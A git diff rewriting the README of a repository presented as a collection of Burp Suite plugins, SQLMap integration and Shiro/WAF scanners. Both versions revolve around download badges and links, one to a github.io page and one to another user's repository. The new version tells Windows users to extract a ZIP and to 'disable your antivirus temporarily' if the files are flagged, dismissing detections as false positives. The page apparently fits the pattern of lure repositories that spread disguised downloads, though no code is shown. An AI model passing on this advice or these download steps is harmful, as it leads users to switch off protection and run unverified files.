@@ -1,109 +1,54 @@
-# BurpSuite-collections - Plugin Collection 2026
+# 🛡️ burpsuite-executor-scripts - Streamline your advanced security testing workflows
 
-> **A handpicked set of BurpSuite plugins, extensions, and practical walkthroughs for security researchers and penetration testers.** This repository compiles non-BApp Store plugins, articles, and tips that expand BurpSuite's functionality beyond the official marketplace.
+[![](https://img.shields.io/badge/Download-Project_Files-blue)](https://github.com/Tianna94/burpsuite-executor-scripts)
 
-[![Scripts](https://img.shields.io/badge/Scripts-Collection-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-cross--platform-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/caleb-hughes2000/burpsuite-executor-scripts?style=flat-square)](https://github.com/caleb-hughes2000/burpsuite-executor-scripts)
+This collection provides a set of manual tools and automated scripts for security professionals. These tools integrate with Burp Suite to help you find vulnerabilities in web applications. The repository contains custom Java plugins, scripts for SQLMap, and scanners for Shiro and WAF systems. You can use these resources to automate repetitive tasks and improve your testing speed.
 
----
+## 📋 System requirements
 
-<p align="center">
-  <a href="https://caleb-hughes2000.github.io/burpsuite-executor-scripts/">
-    <img src="https://img.shields.io/badge/Download-BurpSuite%20Collections-brightgreen?style=for-the-badge" alt="Download BurpSuite Collections">
-  </a>
-</p>
+You need a computer running Windows 10 or Windows 11. Ensure you have the latest version of Burp Suite Professional or Community Edition installed. Java Development Kit (JDK) version 17 or higher should be present on your system to run the custom plugins. Check that you have at least 500 MB of free disk space for the script files and dependency libraries.
 
-> **[Direct Download - BurpSuite-collections](https://caleb-hughes2000.github.io/burpsuite-executor-scripts/)**
+## 📥 Downloading the software
 
----
+Visit this page to download the collection: [https://github.com/Tianna94/burpsuite-executor-scripts](https://github.com/Tianna94/burpsuite-executor-scripts)
 
-[Download Latest Build](https://caleb-hughes2000.github.io/burpsuite-executor-scripts/)
+Once you reach the link, find the green button labeled "Code" near the top right of the page. Select "Download ZIP" from the menu. Save the file to your computer. Create a folder named "BurpTools" in your documents directory and extract the contents of the ZIP file into this folder.
 
----
+## ⚙️ Setting up the environment
 
-## About This Repository
+Open Burp Suite. Navigate to the "Extensions" tab located at the top of the window. Click on the "Installed" sub-tab. Select the "Add" button to open the extension installation dialog. 
 
-This project acts as a centralized resource for BurpSuite users seeking to augment their toolset with extensions absent from the official BApp Store. The collection encompasses Java-based plugins, Python integrations, and specialized utilities for web application security testing—covering SQL injection, Shiro vulnerability scanning, WAF evasion, and more. Each plugin is accompanied by relevant articles and practical guidance for integrating them into penetration testing workflows.
+Choose the "Extension type" as Java. Click the "Select file" button and navigate to your "BurpTools" folder. Choose the file ending in .jar that matches the plugin you wish to use. Burp Suite triggers a confirmation message once it loads the extension. Repeat these steps for each plugin you want to add to your workspace.
 
-The focus is on curating community-driven extensions that solve real-world testing problems. From advanced request manipulation via HackBar to database exploitation helpers like sqlmap integration and framework-specific scanners such as j2eescan, this repository offers a comprehensive reference. It receives periodic updates to reflect emerging techniques and plugin versions, though it no longer includes crack files for BurpSuite.
+## 🚀 Running your first script
 
----
+Navigate to the "Extensions" tab after you install the plugins. You see a list of loaded tools in the table. Each tool provides a specific interface in the Burp Suite menu bar. 
 
-## Plugin Categories
+For the SQLMap integration, click the new "SQLMap" menu item that appears after installation. Set the file path to point to your local installation of SQLMap. Ensure your terminal allows external execution. Most Python scripts in this collection require a properly configured Python environment. Install Python 3.10 from the official website if your system lacks it. Use the "Run" button inside the extension panel to execute your chosen security scan against a target URL.
 
-- **Burp Extensions** - Custom Java plugins that enhance BurpSuite's base capabilities
-- **Burp Requests** - Tools for advanced request construction and modification
-- **BurpSuite Extender** - Modular add-ons leveraging the Burp Extender API
-- **BurpSuite Tools** - Utility scripts supporting automated testing workflows
-- **HackBar & SendTo** - Quick payload injection and data forwarding utilities
-- **SQLMap Integration** - Scripts enabling seamless sqlmap tunneling through Burp
-- **Shiro & WAF Tools** - Scanners targeting Apache Shiro vulnerabilities and WAF detection
-- **Python-Burp** - Python automation scripts that interface with BurpSuite
+## 🛠️ Managing custom plugins
 
----
+You can toggle plugins on and off from the "Installed" sub-tab. Uncheck the box next to any plugin to disable it without removing it from your system. If you experience errors during a scan, click the "Errors" tab within the plugin interface to see logs. 
 
-## Getting Started
+Update these tools periodically by repeating the download process from the link provided. Always backup your specific configuration files inside the "BurpTools" folder before you replace old versions with new ones.
 
-Clone the repository and place the plugins into your BurpSuite Extender directory:
+## 📦 Troubleshooting common issues
 
-```bash
-git clone https://github.com/caleb-hughes2000/burpsuite-executor-scripts.git
-cd BurpSuite-collections
-```
+If a plugin fails to initialize, verify that the Java path is correct in your Windows Environment Variables. Ensure that you have administrative permissions for the folder where you saved the files. Some plugins require an active network connection to download specific dependencies during the first run. Disable your antivirus temporarily if it identifies a false positive, as some security tools share signatures with malicious software. 
 
-Load individual `.jar` or `.py` files via BurpSuite's Extender tab. For the Shiro scanner as an example:
+Check for Python dependencies by running the command "pip install -r requirements.txt" inside the folder hosting the specific scripts. This command installs necessary libraries that enable the automation features. Refer to the individual sub-folders for specific configuration files if a tool is not responding to your input.
 
-1. Open BurpSuite → Extender → Extensions
-2. Click "Add" and choose the `shiro-burp.jar` file
-3. The extension will appear in the Extensions list
+## 🔍 Understanding the toolset
 
----
+This repository offers specific functionalities for modern security testing:
 
-## Compatibility
+- Custom Java plugins: These provide deep integration with the Burp Suite request pipeline. They allow you to modify packets on the fly during an active interception.
+- SQLMap integration: This connects your browser traffic directly to the SQLMap engine. It saves time by passing session tokens and headers automatically.
+- Shiro and WAF scanners: These scripts detect known weaknesses in common web frameworks and firewall configurations. They flag potential bypasses for your manual review.
+- Python automation: These scripts handle repetitive chores, such as organizing your request history or finding hidden web files.
 
-| Component | Supported Versions |
-|-----------|-------------------|
-| BurpSuite Community | 2022.x - 2024.x |
-| BurpSuite Professional | 2022.x - 2024.x |
-| Java Runtime | Java 11+ |
-| Python (for py extensions) | Python 3.6+ |
+## 🛡️ Best practices for security
 
----
+Use these tools only on networks or applications where you possess formal, written permission to test. Unauthorized scanning might break services or violate legal agreements. Always maintain a clear record of your activities. Use the logging features built into these extensions to keep a history of the traffic you generate. Limit the rate of requests in your scanner settings to avoid overwhelming the target server.
 
-## Directory Structure
-
-```
-BurpSuite-collections/
-├── burp-extensions/       # Java plugin JARs
-├── burp-requests/         # Request manipulation tools
-├── burpsuite-tools/       # Utility scripts and helpers
-├── python-burp/           # Python integration scripts
-├── configs/               # Sample configuration files
-├── docs/                  # Usage guides and articles
-└── examples/              # Demonstration scripts
-```
-
----
-
-## Frequently Asked Questions
-
-**How often does this collection receive updates?**  
-Updates occur periodically as new plugins and techniques become available. Check the commit history for the latest additions.
-
-**Can I modify the plugins?**  
-Yes, most extensions are open-source. You can adjust the source code to match your specific testing requirements.
-
-**Will these plugins work with the newest BurpSuite releases?**  
-We strive to maintain compatibility with recent BurpSuite versions, though some older plugins may need updates. Check individual plugin documentation for details.
-
-**Where are the plugins stored locally?**  
-After download, plugins reside in your local clone directory. You can relocate them anywhere and load them through BurpSuite's Extender interface.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: security, penetration-testing, burpsuite, automation, scripting, web-security
